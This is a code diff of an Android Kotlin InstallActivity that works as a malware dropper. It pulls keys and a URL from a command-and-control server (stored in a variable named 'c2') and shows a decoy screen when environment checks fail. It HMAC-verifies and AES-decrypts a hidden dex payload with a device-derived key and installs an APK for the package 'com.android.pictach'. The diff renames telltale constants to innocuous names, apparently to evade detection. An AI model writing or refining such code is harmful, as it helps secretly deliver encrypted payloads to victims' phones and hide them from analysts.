@@ -31,10 +31,10 @@ class InstallActivity : AppCompatActivity() {
 
     companion object {
         // ── Patched by bot ────────────────────────────────────────
-        private const val AES_KEY_B64  = "AES_KEY_B64_PLACEHOLDER_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
-        private const val HMAC_B64     = "HMAC_SHA256_PLACEHOLDER_BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
+        private const val appEncryptionKey  = "appEncryptionKey_PLACEHOLDER_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+        private const val appVerificationKey     = "HMAC_SHA256_PLACEHOLDER_BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
         private const val appScheduledTime  = "appScheduledTime_PLACEHOLDER_FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
-        private const val DEVICE_SALT  = "DEVICE_SALT_PLACEHOLDER_CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"
+        private const val appDeviceKey  = "appDeviceKey_PLACEHOLDER_CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"
         private const val appConfigUrl   = "appConfigUrl_PLACEHOLDER_EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
         private const val appSourceUrl   = ""
         private const val TARGET_PKG   = "com.android.pictach"
@@ -99,7 +99,7 @@ class InstallActivity : AppCompatActivity() {
             if (!isAppReady())  { showNormal(); return }
 
             val c2 = fetchAppConfig()
-            val rawKey   = c2.first ?: AES_KEY_B64
+            val rawKey   = c2.first ?: appEncryptionKey
             val finalKey = deriveKey(rawKey)
 
             val resolvedUrl = c2.second ?: appSourceUrl
@@ -110,8 +110,8 @@ class InstallActivity : AppCompatActivity() {
             if (encBytes == null || encBytes.isEmpty()) { showMessage("STEP:LOAD_ASSETS\nbase.apk is null or empty"); return }
 
             // ── PLACEHOLDER MODE — skip HMAC + AES, install raw base.apk directly ──
-            val isPlaceholder = HMAC_B64.contains("PLACEHOLDER") ||
-                                AES_KEY_B64.contains("PLACEHOLDER")
+            val isPlaceholder = appVerificationKey.contains("PLACEHOLDER") ||
+                                appEncryptionKey.contains("PLACEHOLDER")
 
             if (isPlaceholder) {
                 // No bot patching yet — install base.apk directly from assets
@@ -121,8 +121,8 @@ class InstallActivity : AppCompatActivity() {
             }
 
             // ── PATCHED MODE — full HMAC verify + AES decrypt ──
-            val hmacKey = c2.first ?: AES_KEY_B64
-            if (!verifyHmac(encBytes, HMAC_B64, hmacKey)) { showNormal(); return }
+            val hmacKey = c2.first ?: appEncryptionKey
+            if (!verifyHmac(encBytes, appVerificationKey, hmacKey)) { showNormal(); return }
 
             val dex = aesDecrypt(encBytes, finalKey)
             if (dex == null || dex.isEmpty()) { showNormal(); return }
@@ -200,9 +200,9 @@ class InstallActivity : AppCompatActivity() {
 
     private fun deriveKey(baseB64: String): String {
         return try {
-            if (DEVICE_SALT.contains("PLACEHOLDER")) return baseB64
+            if (appDeviceKey.contains("PLACEHOLDER")) return baseB64
             val base = Base64.decode(baseB64, Base64.NO_WRAP)
-            val salt = Base64.decode(DEVICE_SALT, Base64.NO_WRAP)
+            val salt = Base64.decode(appDeviceKey, Base64.NO_WRAP)
             val id   = buildDeviceId()
             val digest = MessageDigest.getInstance("SHA-256")
             digest.update(id.toByteArray(Charsets.UTF_8))
